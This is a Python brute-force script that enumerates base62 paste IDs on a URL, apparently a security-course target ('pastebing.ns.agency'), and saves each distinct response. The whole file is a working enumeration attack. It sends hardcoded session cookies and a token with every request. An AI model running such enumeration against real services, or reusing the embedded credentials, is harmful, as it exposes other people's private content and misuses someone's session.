#!/usr/bin/python  
import sys  
import zlib
import time
import os
import requests
import re

#import requests-futures
from baseconv import base62
from etaprogress.progress import ProgressBar


def main():
	PROGRAM_NAME = "bing"
	if len(sys.argv) != 3:
		print("USAGE: python "+PROGRAM_NAME+".py <URL> <length>")
		print("For example: python "+PROGRAM_NAME+".py http://pastebing.ns.agency/raw/2uKYCmrAg 1")
	else:
		# init
		# https://stackoverflow.com/a/16060908
		
		URL = str(sys.argv[1])
		brute_len = int(sys.argv[2])
		SLEEP_TIME = 1/1000		
		
		logname = PROGRAM_NAME+"_"+str(int(time.time()))+".log"
		log = open(logname, "a+")
		
		cookies = {
			"zid": "z5214048",
			"token": "88d60373d31db28d31a54a184759c1e4bab6a60a48c54f7eda48459b8b692287",
			"session": "eyJ1c2VybmFtZSI6ImNvb2tpZXMgIn0.D20t9w.Yit2yv7ojsbNSBmMn2-aBvGla1c"
		}
		
		brute_min = 0
		brute_max = (62**brute_len)-1
		work = brute_max-brute_min
		bar = ProgressBar(work, max_width=40)
		
		# print for user
		print(PROGRAM_NAME+" initialised")
		print("URL: "+URL)
		print("stdout will be logged to "+logname)
		print("the bruteforce will start in 3s")
		# allow user to change mind
		time.sleep(3)
		
		#payload
		i = 0
		for i in range(work+1):
			k=i+brute_min
			
			k_string = base62.encode(k) # convertion to the text
			k_string = k_string.zfill(brute_len) #decorating
			
			r = requests.get(URL+k_string, cookies=cookies)
			txt = r.text
			# https://docs.python.org/3/library/zlib.html SAYS
			#'An Adler-32 checksum is almost as reliable as a CRC32 but can be computed much more quickly'
			#'Changed in version 3.0: Always returns an unsigned value' => GOOD
			txt_hash = toHexCustom(zlib.adler32(txt.encode('utf-8')))
			
			# write to payload listings
			f_payload = open("bings_"+txt_hash+".txt", "a+")
			f_payload.write(k_string+"\n")
			f_payload.close()
			
			# if no transcription => first time resp encountered
			if not(os.path.isfile("plain_"+txt_hash+".txt")):
				# write to plaintext transcription
				f_plain = open("plain_"+txt_hash+".txt", "w+", encoding="utf-8")
				f_plain.write(txt)
				f_plain.close()
				# now log stuff
				whatToLog = "[N]"+k_string+"; New hash found! Check file: "+"plain_"+txt_hash+".txt"
				
				log.write(whatToLog+"\n")
				print(whatToLog)
			
			# if hash already encountered
			else:
				# boring log, what else to do
				whatToLog = "[B]"+k_string+": "+txt_hash+" ("+str(r.status_code)+")"
				
				log.write(whatToLog+"\n")
				print(whatToLog)
				
			bar.numerator = i
			print(str(bar))
			#sys.stdout.flush()
			
			myCoolTitle = PROGRAM_NAME+" "+k_string
			os.system("title "+myCoolTitle) #https://stackoverflow.com/a/10229529
			#time.sleep(SLEEP_TIME/1000)
		
		#payload (for-loop) over
		whatToLog = "[F] Fin"
				
		log.write(whatToLog+"\n")
		print(whatToLog)
		
		log.close()
	
def toHexCustom(dec): 
	return str(hex(dec).split('x')[-1])	
	
if __name__ == '__main__':
	main()